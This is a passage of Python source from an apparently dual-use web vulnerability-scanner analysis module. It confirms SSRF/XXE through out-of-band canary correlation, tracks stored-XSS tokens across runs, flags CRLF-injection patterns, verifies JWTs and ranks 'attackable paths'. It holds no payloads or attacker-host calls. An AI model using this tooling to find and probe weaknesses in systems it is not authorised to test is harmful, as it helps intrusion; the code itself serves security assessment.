            return yaml.safe_load(txt) or {}
        except Exception:
            return {}
    except Exception as e:
        log.warning("load_config_any failed: %r", e)
        return {}

def merge_features(base: Optional[Dict[str, Any]], override: Optional[Dict[str, Any]]) -> Dict[str, Any]:
    """
    Shallow merge of feature dicts under 'features' key.
    """
    base = base or {}
    override = override or {}
    out = {"features": {}}
    out["features"].update(base.get("features") or {})
    out["features"].update(override.get("features") or {})
    return validate_features(out)

# ──────────────────────────────────────────────────────────────────────────────
# Report assembler convenience (end-to-end glue with extras)

def assemble_and_render_report(rows: List[Dict[str, Any]],
                               kb: Optional[Dict[str, Any]] = None,
                               config: Optional[Dict[str, Any]] = None,
                               page: int = 1, per_page: int = 20,
                               with_extras: bool = True) -> Dict[str, Any]:
    """
    High-level convenience for CLI/Orchestrator:
      - enrich rows
      - finalize report (latency, neg controls, sections)
      - render ASCII (with extras: Doctor/Gaps/OOB plan)
    """
    cfg = validate_features(config or {})
    rows = apply_enrichment_to_rows(rows, kb=kb or {}, features=cfg)
    out = finalize_report_hook(rows, output={}, features=cfg, page=page, per_page=per_page)
    ascii_report = (render_full_ascii_report_with_extras if with_extras else render_full_ascii_report)(
        rows, sections={
            "cards": out.get("attackable_cards") or [],
            "quality_gate_snapshot": out.get("quality_gate_snapshot") or {},
            "family_sources_snapshot": out.get("family_sources_snapshot") or {},
            "cookie_rows": out.get("cookie_rows") or [],
        },
        page=page, per_page=per_page
    )
    out["ascii"] = ascii_report
    out["rows"] = rows
    return out

# ──────────────────────────────────────────────────────────────────────────────
# Warnings for incompatible flags (help user spot misconfig quickly)

def warn_incompatible_config(config: Optional[Dict[str, Any]]) -> List[str]:
    """
    Return list of warnings about feature flags that require missing modules or settings.
    """
    cfg = validate_features(config or {})
    feats = cfg.get("features", {})
    warns: List[str] = []
    if feats.get("family_ai", False):
        if not (hasattr(vector_store, "semantic_family_vote") or hasattr(securebert_adapter, "semantic_vote")):
            warns.append("family_ai enabled but no AI backend available (vector_store/securebert).")
    if feats.get("jwt_crypto", False) and not feats.get("jwt_hs_secrets"):
        warns.append("jwt_crypto enabled but no jwt_hs_secrets provided (set features.jwt_hs_secrets).")
    if feats.get("oob_channels", False) and not _oob_base(cfg):
        warns.append("oob_channels enabled but oob.base_domain/base_url not configured.")
    if feats.get("uploads_ct", True) is False:
        warns.append("uploads_ct disabled (you may miss MIME confusion issues).")
    return warns

def render_config_warnings(warns: List[str]) -> str:
    if not warns:
        return ""
    lines = []
    lines.append("════════════════════════════════ CONFIG WARNINGS ═══════════════════════════════════════════")
    for w in warns:
        lines.append(f"- {w}")
    return "\n".join(lines) + "\n"

# ──────────────────────────────────────────────────────────────────────────────
# Export helpers for debug: JSONL dump & ASCII to file

def export_debug_bundle(rows: List[Dict[str, Any]], ascii_report: str, dirpath: str = "/mnt/data/debug_bundle") -> Dict[str, Any]:
    """
    Write:
      - rows.json (pretty)
      - report.txt
      - top10.json (cards only)
    """
    from pathlib import Path
    meta = {"ok": False, "dir": dirpath}
    try:
        d = Path(dirpath)
        d.mkdir(parents=True, exist_ok=True)
        (d / "rows.json").write_text(export_rows_json(rows, pretty=True), encoding="utf-8")
        (d / "report.txt").write_text(ascii_report, encoding="utf-8")
        # derive top10 from rows via build_attackable_paths
        cards = build_attackable_paths(rows, max_top=DEFAULTS["MAX_TOP"])
        (d / "top10.json").write_text(json.dumps(cards, indent=2, ensure_ascii=False), encoding="utf-8")
        meta["ok"] = True
    except Exception as e:
        log.warning("export_debug_bundle failed: %r", e)
    return meta

# ──────────────────────────────────────────────────────────────────────────────
# CLI convenience wrapper with extras & config-warnings

def _cli_main(argv: Optional[List[str]] = None) -> int:  # type: ignore[override]
    import argparse, sys, pathlib
    p = argparse.ArgumentParser(prog="analysis_extend", add_help=True)
    p.add_argument("-i","--input", type=str, help="Input JSON file (array of records). If omitted, read STDIN.")
    p.add_argument("-k","--kb", type=str, help="KB file (JSON/YAML) optional.")
    p.add_argument("-c","--config", type=str, help="Features/config (JSON/YAML).")
    p.add_argument("--page", type=int, default=1)
    p.add_argument("--per-page", type=int, default=20)
    p.add_argument("--json", action="store_true", help="Output enriched rows as JSON instead of ASCII.")
    p.add_argument("--legend", action="store_true", help="Print legend and exit.")
    p.add_argument("--export-debug", action="store_true", help="Write debug bundle to /mnt/data/debug_bundle")
    args = p.parse_args(argv or [])

    if args.legend:
        sys.stdout.write(render_legend())
        return 0

    def _read_text(path: Optional[str]) -> str:
        if not path:
            return sys.stdin.read()
        try:
            return pathlib.Path(path).read_text(encoding="utf-8")
        except Exception as e:
            log.warning("Unable to read %s: %r", path, e)
            return ""

    raw = _read_text(args.input)
    try:
        rows = json.loads(raw) if raw.strip() else []
    except Exception as e:
        log.warning("Failed to parse input JSON: %r", e)
        rows = []

    # KB
    kb_obj = {}
    kb_raw = _read_text(args.kb)
    if kb_raw.strip():
        try:
            if kb_raw.strip().startswith("{"):
                kb_obj = json.loads(kb_raw)
            else:
                try:
                    import yaml  # optional
                    kb_obj = yaml.safe_load(kb_raw) or {}
                except Exception:
                    kb_obj = {}
        except Exception as e:
            log.warning("Failed to parse KB: %r", e)

    # Config
    cfg_obj = {}
    cfg_raw = _read_text(args.config)
    if cfg_raw.strip():
        try:
            cfg_obj = load_config_any(args.config) or {}
        except Exception as e:
            log.warning("Failed to load config: %r", e)

    cfg_obj = validate_features(cfg_obj)
    warns = warn_incompatible_config(cfg_obj)

    # Process
    rows = ensure_rows_minimum_contract(rows)
    result = assemble_and_render_report(rows, kb=kb_obj, config=cfg_obj, page=args.page, per_page=args.per_page, with_extras=True)

    # Output
    if warns:
        sys.stdout.write(render_config_warnings(warns))

    if args.json:
        sys.stdout.write(export_rows_json(result.get("rows") or [], pretty=True))
    else:
        sys.stdout.write(result.get("ascii") or "No output.\n")

    if args.export_debug:
        meta = export_debug_bundle(result.get("rows") or [], result.get("ascii") or "")
        sys.stdout.write(f"\n[debug] export bundle: {meta}\n")

    return 0

# ──────────────────────────────────────────────────────────────────────────────
# Public API update

__all__ = list(sorted(set(__all__ + [
    "load_config_any",
    "merge_features",
    "assemble_and_render_report",
    "warn_incompatible_config",
    "render_config_warnings",
    "export_debug_bundle",
])))
# (continued) analysis_extend.py
# ──────────────────────────────────────────────────────────────────────────────
# OOB (Out-of-Band) hit correlator — confirm SSRF/XXE with local evidence
# Reads tokens from a user-provided log (no network) and matches planned canaries.

RC.update({
    "E_OOB_CONF": "E-OOB-CONF",   # confirmed OOB callback observed
})

def _load_oob_hits_from_file(path: Optional[str]) -> List[str]:
    """
    Read canary tokens from a simple log file. Accepts raw lines or JSON array.
    Each hit should contain the token string (e.g., 'a1b2c3d4e5').
    """
    if not path:
        return []
    try:
        txt = Path(path).read_text(encoding="utf-8")
        if not txt.strip():
            return []
        # JSON list support
        if txt.lstrip().startswith("["):
            arr = json.loads(txt)
            return [str(x) for x in arr if isinstance(x, (str,int))]
        # Fallback: one hit per line
        hits = []
        for ln in txt.splitlines():
            ln = ln.strip()
            if not ln:
                continue
            # extract token-like substrings (hex-ish)
            m = re.findall(r"[a-fA-F0-9]{8,32}", ln)
            if m:
                hits.extend(m)
        return list(dict.fromkeys(hits))  # de-dup, preserve order
    except Exception as e:
        log.warning("_load_oob_hits_from_file failed: %r", e)
        return []

def load_oob_hits(features: Optional[Dict[str, Any]] = None) -> List[str]:
    """
    Sources of OOB hits:
      - features.oob.hits (list of strings)
      - features.oob.hits_file (path to log file)
    """
    feats = features or _CURRENT_FEATURES or {}
    oob = feats.get("oob") or feats.get("features", {}).get("oob") or {}
    hits: List[str] = []
    try:
        if isinstance(oob, dict):
            raw = oob.get("hits")
            if isinstance(raw, list):
                hits.extend([str(x) for x in raw if isinstance(x, (str,int))])
            if not hits and oob.get("hits_file"):
                hits.extend(_load_oob_hits_from_file(str(oob.get("hits_file"))))
    except Exception as e:
        log.warning("load_oob_hits failed: %r", e)
    # normalize & de-dup
    uniq = []
    seen = set()
    for h in hits:
        s = str(h).strip().lower()
        if s and s not in seen:
            seen.add(s); uniq.append(s)
    return uniq

def _token_from_canary(canary: Optional[str]) -> Optional[str]:
    if not canary:
        return None
    # token is the left-most label before base domain or the final path segment (we include both)
    try:
        u = urlparse(canary)
        host = u.netloc.split(":")[0]
        sub = host.split(".")[0] if host else ""
        end = (u.path or "").rstrip("/").split("/")[-1]
        for cand in (sub, end):
            cand = (cand or "").strip().lower()
            if re.fullmatch(r"[a-f0-9]{6,32}", cand or ""):
                return cand
    except Exception:
        return None
    return None

def correlate_oob_hits(rows: List[Dict[str, Any]], hits: List[str]) -> int:
    """
    For each row with an OOB plan, if its canary token appears in hits -> confirm.
    Returns number of confirmations.
    """
    if not rows or not hits:
        return 0
    hset = {str(h).lower() for h in hits}
    conf = 0
    for r in rows:
        for p in (r.get("oob_plan") or []):
            if not isinstance(p, dict):
                continue
            can = _token_from_canary(p.get("canary"))
            if can and can in hset:
                _add_reason(r, RC["E_OOB_CONF"])
                # Boost confidence for SSRF/XXE families
                ab = _safe_float(r.get("ab_confidence"))
                if ab < 0.85:
                    r["ab_confidence"] = 0.85
                extend_confidence(r, features=None)
                p["status"] = "confirmed"
                conf += 1
    return conf

# Hook OOB correlation into finalize pipeline with extras
_prev_finalize_report_hook2 = finalize_report_hook
def finalize_report_hook(rows: List[Dict[str, Any]], output: Optional[Dict[str, Any]] = None, features: Optional[Dict[str, Any]] = None, page: int = 1, per_page: int = 20) -> Dict[str, Any]:  # type: ignore[override]
    out = _prev_finalize_report_hook2(rows, output=output, features=features, page=page, per_page=per_page)
    try:
        hits = load_oob_hits(features or {})
        if hits:
            confirmed = correlate_oob_hits(rows, hits)
            out["oob_confirmed"] = confirmed
    except Exception as e:
        log.warning("OOB correlation failed: %r", e)
    return out

# ──────────────────────────────────────────────────────────────────────────────
# Stored-XSS persistence across runs (save POST tokens, scan next runs)

STORED_TOKENS_PATH = Path("/mnt/data/analysis_extend_tokens.json")

def load_stored_tokens(path: Optional[Path] = None) -> List[str]:
    p = path or STORED_TOKENS_PATH
    try:
        if p.exists():
            txt = p.read_text(encoding="utf-8")
            arr = json.loads(txt) if txt.strip() else []
            return [str(x) for x in arr if isinstance(x, (str,int))]
    except Exception as e:
        log.warning("load_stored_tokens failed: %r", e)
    return []

def save_stored_tokens(tokens: List[str], path: Optional[Path] = None) -> bool:
    p = path or STORED_TOKENS_PATH
    try:
        p.parent.mkdir(parents=True, exist_ok=True)
        uniq = []
        seen = set()
        for t in tokens:
            s = str(t).strip()
            if s and s not in seen:
                seen.add(s); uniq.append(s)
        p.write_text(json.dumps(uniq, indent=2, ensure_ascii=False), encoding="utf-8")
        return True
    except Exception as e:
        log.warning("save_stored_tokens failed: %r", e)
        return False

def persist_and_scan_stored_xss(rows: List[Dict[str, Any]]) -> Dict[str, int]:
    """
    1) Extract POST tokens from current run and merge into token store.
    2) Scan current GET/HTML responses for tokens from *previous* runs.
    """
    stats = {"tokens_added": 0, "hits": 0}
    try:
        prev = set(load_stored_tokens())
        # scan current GETs with previously seen tokens
        if prev:
            for r in rows or []:
                method = str(r.get("method") or r.get("meth") or "").upper()
                ctype = (r.get("content_type") or "").lower()
                if method != "GET" or ("html" not in ctype and "xml" not in ctype):
                    continue
                body = (r.get("body_snippet") or r.get("body") or "")
                low = body.lower()
                for tok in list(prev):
                    tok_l = tok.lower()
                    if tok in body or tok_l in low or html.escape(tok) in body:
                        _add_reason(r, RC["E_XSS_STORED_CONF"])
                        # Confidence bump
                        ab = _safe_float(r.get("ab_confidence"))
                        if ab < 0.7:
                            r["ab_confidence"] = 0.7
                        extend_confidence(r, features=None)
                        stats["hits"] += 1
                        break
        # collect tokens from this run for future runs
        cands = [t for t, _src in _collect_candidate_tokens(rows)]
        merged = list(prev.union(cands))
        if save_stored_tokens(merged):
            stats["tokens_added"] = max(0, len(merged) - len(prev))
    except Exception as e:
        log.warning("persist_and_scan_stored_xss failed: %r", e)
    return stats

# Integrate persistence into finalize pipeline
_prev_finalize_report_hook3 = finalize_report_hook
def finalize_report_hook(rows: List[Dict[str, Any]], output: Optional[Dict[str, Any]] = None, features: Optional[Dict[str, Any]] = None, page: int = 1, per_page: int = 20) -> Dict[str, Any]:  # type: ignore[override]
    out = _prev_finalize_report_hook3(rows, output=output, features=features, page=page, per_page=per_page)
    try:
        x = persist_and_scan_stored_xss(rows)
        out["stored_xss"] = x
    except Exception as e:
        log.warning("stored XSS persistence step failed: %r", e)
    return out

# ──────────────────────────────────────────────────────────────────────────────
# CRLF/Header-injection hint (input-side) — advisory

RC.update({
    "W_CRLF_INJECT_HINT": "W-CRLF-INJECT-HINT",
})

def extend_header_injection_hints(record: Dict[str, Any]) -> None:
    """
    If any param contains CRLF sequences or header-like patterns, raise a hint.
    """
    params = _extract_params(record)
    for v in (params or {}).values():
        s = str(v or "")
        if "%0d%0a" in s.lower() or "\r\n" in s:
            _add_reason(record, RC["W_CRLF_INJECT_HINT"])
            break

# Wire hint into enrichment
_prev_enrich_record5 = enrich_record
def enrich_record(record: Dict[str, Any], kb: Optional[Dict[str, Any]] = None, features: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:  # type: ignore[override]
    rec = _prev_enrich_record5(record, kb=kb, features=features)
    try:
        extend_header_injection_hints(rec)
    except Exception as e:
        log.warning("extend_header_injection_hints failed: %r", e)
    return rec

# ──────────────────────────────────────────────────────────────────────────────
# Update gap reporter: we now have
#  - Stored XSS persistence across/between runs (considered covered)
#  - OOB correlation (if logs provided) reduces SSRF/XXE gap
# Remaining core enterprise gaps:
#  1) DOM-XSS with real JS execution
#  2) JWT RS/ECDSA verification via JWKS (offline unless keys provided and crypto lib available)
#  3) True external OOB infra (when not configured)

def report_remaining_gaps(features: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:  # type: ignore[override]
    feats = validate_features(features or {})
    missing: List[str] = []

    # 1) DOM-XSS engine
    missing.append("xss_dom (headless JS execution)")

    # 2) JWT RS/ECDSA verify (we only do HS256; RS needs crypto/JWKS)
    missing.append("jwt_crypto (RS/ECDSA via JWKS)")

    # 3) OOB infra only if not configured or no hits available
    base = _oob_base(feats)
    have_hits = bool(load_oob_hits(feats))
    if not base and not have_hits:
        missing.append("ssrf_xxe_oob (external canary infra)")

    return {
        "missing": missing,
        "descriptions": {
            "xss_dom (headless JS execution)": "Execute DOM to detect sinks like innerHTML/eval at runtime.",
            "jwt_crypto (RS/ECDSA via JWKS)": "Verify RSA/ECDSA signatures against local JWKS/PEM.",
            "ssrf_xxe_oob (external canary infra)": "Collect DNS/HTTP callbacks to confirm SSRF/XXE.",
        },
        "count": len(missing),
    }

# ──────────────────────────────────────────────────────────────────────────────
# Public API update

__all__ = list(sorted(set(__all__ + [
    "load_oob_hits",
    "correlate_oob_hits",
    "load_stored_tokens",
    "save_stored_tokens",
    "persist_and_scan_stored_xss",
    "extend_header_injection_hints",
])))
# (continued) analysis_extend.py
# ──────────────────────────────────────────────────────────────────────────────
# DOM-XSS external findings correlator (headless engine integration)
# Accepts precomputed DOM sink hits via config or file and maps them to rows.

RC.update({
    "I_DOMX_CONF": "I-DOMX-CONF",  # confirmed DOM sink via external engine
})

def _load_dom_findings_from_file(path: Optional[str]) -> List[Dict[str, Any]]:
    """
    Read DOM findings from a JSON file: [{"url":"...","sink":"innerHTML","note":"..."}]
    """
    if not path:
        return []
    try:
        txt = Path(path).read_text(encoding="utf-8")
        data = json.loads(txt) if txt.strip() else []
        return [x for x in data if isinstance(x, dict)]
    except Exception as e:
        log.warning("_load_dom_findings_from_file failed: %r", e)
        return []

def load_dom_findings(features: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
    """
    Sources:
      - features.dom.findings (list of dicts)
      - features.dom.findings_file (path to JSON)
    """
    feats = features or _CURRENT_FEATURES or {}
    dom = feats.get("dom") or feats.get("features", {}).get("dom") or {}
    out: List[Dict[str, Any]] = []
    try:
        if isinstance(dom, dict):
            if isinstance(dom.get("findings"), list):
                out.extend([x for x in dom["findings"] if isinstance(x, dict)])
            if dom.get("findings_file"):
                out.extend(_load_dom_findings_from_file(str(dom.get("findings_file"))))
    except Exception as e:
        log.warning("load_dom_findings failed: %r", e)
    # de-dup by url+sink
    uniq = []
    seen = set()
    for f in out:
        k = f"{f.get('url','')}|{f.get('sink','')}"
        if k not in seen:
            seen.add(k); uniq.append(f)
    return uniq

def correlate_dom_findings(rows: List[Dict[str, Any]], findings: List[Dict[str, Any]]) -> int:
    """
    Match findings to rows by URL (exact or regex via 'url_re') and add I-DOMX-CONF.
    Returns number of matches.
    """
    if not rows or not findings:
        return 0
    hits = 0
    for f in findings:
        url = f.get("url")
        url_re = f.get("url_re")
        sink = f.get("sink") or "dom-sink"
        for r in rows:
            u = r.get("url") or ""
            ok = False
            if url and u.startswith(str(url)):
                ok = True
            elif url_re:
                try:
                    if re.search(str(url_re), u):
                        ok = True
                except Exception:
                    ok = False
            if not ok:
                continue
            _add_reason(r, RC["I_DOMX_CONF"])
            _add_reason(r, RC["E_REFLECT_DOM"])
            # Boost conf (DOM sinks are strong)
            if _safe_float(r.get("ab_confidence")) < 0.8:
                r["ab_confidence"] = 0.8
                extend_confidence(r, features=None)
            hits += 1
    return hits

# Hook DOM correlator into finalize pipeline
_prev_finalize_report_hook4 = finalize_report_hook
def finalize_report_hook(rows: List[Dict[str, Any]], output: Optional[Dict[str, Any]] = None, features: Optional[Dict[str, Any]] = None, page: int = 1, per_page: int = 20) -> Dict[str, Any]:  # type: ignore[override]
    out = _prev_finalize_report_hook4(rows, output=output, features=features, page=page, per_page=per_page)
    try:
        dom = load_dom_findings(features or {})
        if dom:
            confirmed = correlate_dom_findings(rows, dom)
            out["domx_confirmed"] = confirmed
    except Exception as e:
        log.warning("DOM findings correlation failed: %r", e)
    return out

# ──────────────────────────────────────────────────────────────────────────────
# JWT RS/ECDSA verification via PyJWT (optional; needs keys in config)

RC.update({
    "I_JWT_VALID_RS": "I-JWT-VALID-RS",
    "W_JWT_KID_MISS": "W-JWT-KID-MISS",
})

def _jwt_alg_is_rs_es(alg: str) -> bool:
    a = (alg or "").upper()
    return a.startswith("RS") or a.startswith("ES")

def _get_rs_keys_from_features(features: Optional[Dict[str, Any]]) -> Dict[str, str]:
    """
    Return map kid->PEM (or single key under key None).
    Accepts:
      - features.jwt_rs_keys: {"kid1":"-----BEGIN PUBLIC KEY-----..."}
      - features.jwt_rs_pems: ["PEM1","PEM2"]
      - features.jwt_rs_file: path to JSON {"keys":{"kid":"PEM", ...}} or {"pems":[...] }
    """
    feats = features or _CURRENT_FEATURES or {}
    keys: Dict[str, str] = {}
    src = feats.get("jwt_rs_keys") or feats.get("features", {}).get("jwt_rs_keys")
    if isinstance(src, dict):
        for k, v in src.items():
            if isinstance(v, str) and "BEGIN" in v:
                keys[str(k) or ""] = v
    pems = feats.get("jwt_rs_pems") or feats.get("features", {}).get("jwt_rs_pems")
    if isinstance(pems, list):
        for i, v in enumerate(pems):
            if isinstance(v, str) and "BEGIN" in v:
                keys[f"pem{i}"] = v
    fpath = feats.get("jwt_rs_file") or feats.get("features", {}).get("jwt_rs_file")
    if fpath:
        try:
            txt = Path(str(fpath)).read_text(encoding="utf-8")
            data = json.loads(txt) if txt.strip() else {}
            if isinstance(data.get("keys"), dict):
                for k, v in data["keys"].items():
                    if isinstance(v, str) and "BEGIN" in v:
                        keys[str(k) or ""] = v
            elif isinstance(data.get("pems"), list):
                for i, v in enumerate(data["pems"]):
                    if isinstance(v, str) and "BEGIN" in v:
                        keys[f"pem{i}"] = v
        except Exception as e:
            log.warning("jwt_rs_file load failed: %r", e)
    return keys

def verify_jwt_rs(record: Dict[str, Any], features: Optional[Dict[str, Any]] = None) -> None:
    """
    Attempt RS/ES verification if PyJWT is available and PEM keys are configured.
    """
    try:
        import jwt as pyjwt  # type: ignore
    except Exception:
        # library not present; silently ignore
        return
    headers = record.get("headers") or {}
    authz = _header_lookup(headers, "Authorization") or ""
    if "bearer " not in authz.lower():
        return
    token = authz.split()[-1].strip()
    hdr, _pl = _parse_jwt(token)
    if not isinstance(hdr, dict):
        return
    alg = str(hdr.get("alg") or "")
    if not _jwt_alg_is_rs_es(alg):
        return
    kid = str(hdr.get("kid") or "")
    keys = _get_rs_keys_from_features(features)
    if not keys:
        return
    verified = False
    if kid and kid in keys:
        try:
            pyjwt.decode(token, keys[kid], algorithms=[alg], options={"verify_aud": False})
            verified = True
        except Exception:
            pass
    else:
        # try all keys
        if kid and kid not in keys:
            _add_reason(record, RC["W_JWT_KID_MISS"])
        for pem in keys.values():
            try:
                pyjwt.decode(token, pem, algorithms=[alg], options={"verify_aud": False})
                verified = True
                break
            except Exception:
                continue
    if verified:
        _add_reason(record, RC["I_JWT_VALID_RS"])
        if _safe_float(record.get("ab_confidence")) < 0.6:
            record["ab_confidence"] = 0.6
            extend_confidence(record, features=None)

# Insert RS verify into enrichment
_prev_enrich_record6 = enrich_record
def enrich_record(record: Dict[str, Any], kb: Optional[Dict[str, Any]] = None, features: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:  # type: ignore[override]
    rec = _prev_enrich_record6(record, kb=kb, features=features)
    try:
        verify_jwt_rs(rec, features=features)
    except Exception as e:
        log.warning("verify_jwt_rs failed: %r", e)
    return rec

# ──────────────────────────────────────────────────────────────────────────────
# Export OOB plan to file for external agents (so they can fetch and probe)

def export_oob_plan(rows: List[Dict[str, Any]], path: str = "/mnt/data/oob_plan.json") -> Dict[str, Any]:
    """
    Write JSON array of planned canaries for external infra.
    """
    items = []
    for r in rows or []:
        for p in (r.get("oob_plan") or []):
            if not isinstance(p, dict):
                continue
            if p.get("canary"):
                items.append({"url": r.get("url"), "family": p.get("family"), "canary": p.get("canary")})
    ok = False
    try:
        Path(path).parent.mkdir(parents=True, exist_ok=True)
        Path(path).write_text(json.dumps(items, indent=2, ensure_ascii=False), encoding="utf-8")
        ok = True
    except Exception as e:
        log.warning("export_oob_plan failed: %r", e)
    return {"ok": ok, "count": len(items), "file": path}

# Wire exporter after finalize (so plans are ready)
_prev_finalize_report_hook5 = finalize_report_hook
def finalize_report_hook(rows: List[Dict[str, Any]], output: Optional[Dict[str, Any]] = None, features: Optional[Dict[str, Any]] = None, page: int = 1, per_page: int = 20) -> Dict[str, Any]:  # type: ignore[override]
    out = _prev_finalize_report_hook5(rows, output=output, features=features, page=page, per_page=per_page)
    try:
        oob_path = None
        feats = validate_features(features or {})
        oob_conf = feats.get("features", {}).get("oob") or feats.get("oob")
        if isinstance(oob_conf, dict):
            oob_path = oob_conf.get("plan_file")
        if oob_path:
            meta = export_oob_plan(rows, path=str(oob_path))
            out["oob_plan_export"] = meta
    except Exception as e:
        log.warning("export_oob_plan in finalize failed: %r", e)
    return out

# ──────────────────────────────────────────────────────────────────────────────
# Update gap reporter to reflect new integrations

def report_remaining_gaps(features: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:  # type: ignore[override]
    feats = validate_features(features or {})
    missing: List[str] = []

    # DOM-XSS: if external findings configured or present, consider covered
    dom_findings = load_dom_findings(feats)
    if not dom_findings:
        missing.append("xss_dom (headless JS execution)")

    # JWT RS/ECDSA: covered if keys provided *and* PyJWT available
    try:
        import jwt as _pyjwt  # type: ignore  # noqa
        have_pyjwt = True
    except Exception:
        have_pyjwt = False
    rs_keys = bool(_get_rs_keys_from_features(feats))
    if not (have_pyjwt and rs_keys):
        missing.append("jwt_crypto (RS/ECDSA via JWKS/PEM)")

    # OOB infra: covered if base configured OR hits available
    base = _oob_base(feats)
    have_hits = bool(load_oob_hits(feats))
    if not base and not have_hits:
        missing.append("ssrf_xxe_oob (external canary infra)")

    desc = {
        "xss_dom (headless JS execution)": "Provide DOM findings via features.dom.findings(_file) or integrate a headless scanner.",
        "jwt_crypto (RS/ECDSA via JWKS/PEM)": "Install PyJWT and configure PEMs under features.jwt_rs_keys/jwt_rs_pems.",
        "ssrf_xxe_oob (external canary infra)": "Set features.oob.base_domain and feed hits via features.oob.hits(_file).",
    }
    return {"missing": missing, "descriptions": desc, "count": len(missing)}

# ──────────────────────────────────────────────────────────────────────────────
# Public API update

__all__ = list(sorted(set(__all__ + [
    "load_dom_findings",
    "correlate_dom_findings",
    "verify_jwt_rs",
    "export_oob_plan",
])))

def build_top10_ascii(rows, features=None, limit=10):
    min_score = ((features or {}).get("quality_gate") or {}).get("min_score_for_top10", 0.05)
    seen = set()
    cards = []
    for r in rows:
        if not _is_attackable(r, min_score):
            continue
        key = _sig_key_of(r)
        if key in seen:
            continue
        seen.add(key)
        url = r.get("url","-")
        fam = r.get("family","unknown")
        conf = r.get("confidence","-")
        score = int(round((r.get("psi_score") or 0.0)*100))
        reasons = ", ".join(_as_list(r.get("reason_codes")))
        cards.append((score, f"{len(seen):>2}. {score:>3}%  {fam:<8}  {conf:<4}  {url}\n    REASONS: {reasons}"))
        if len(cards) >= limit:
            break
    if not cards:
        return "No attackable paths."
    header = "════════════════════════════════ ATTACKABLE PATHS — TOP 10 ═══════════════════════════════"
    body = "\n".join(c[1] for c in sorted(cards, key=lambda x: -x[0]))
    return f"{header}\n{body}\n"

def ab_compare(*args, **kwargs):
    # returns (evidence_dict_or_None, confidence_float)
    return None, 0.0

def evaluate_canary_effect(*args, **kwargs):
    # negative control outcome
    return {"effect": "none", "delta": 0.0}

# === PATCH 4: stubs per smoke =================================================
def ab_compare(*args, **kwargs):
    return None, 0.0

def evaluate_canary_effect(*args, **kwargs):
    return {"effect": "none", "delta": 0.0}
# ============================================================================ #
